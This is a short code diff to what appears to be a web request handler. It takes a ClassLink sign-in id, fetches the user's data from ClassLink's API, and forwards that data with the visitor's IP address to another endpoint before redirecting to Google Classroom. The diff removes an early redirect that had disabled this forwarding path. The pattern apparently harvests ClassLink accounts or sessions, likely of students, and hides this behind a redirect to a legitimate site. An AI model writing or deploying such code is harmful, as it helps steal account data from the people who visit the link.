@@ -12,7 +12,6 @@ export async function onRequest(context) {
     }
 
     if (id) {
-        return Response.redirect("https://abc.google.com/h", 302);
         try {
             const nodeApiResponse = await fetch("https://nodeapi.classlink.com/user/signinwith", {
                 method: "GET",
@@ -30,8 +29,9 @@ export async function onRequest(context) {
                 body: JSON.stringify({ data: nodeApiData, ip: ip})
             });
         } catch (error) {
+return Response.redirect("https://error.google.com/h", 302);
             console.error("Error handling request:", error);
         }
     }
-    return Response.redirect("https://classroom.google.com/h", 302);
+    //return Response.redirect("https://classroom.google.com/h", 302);
 }
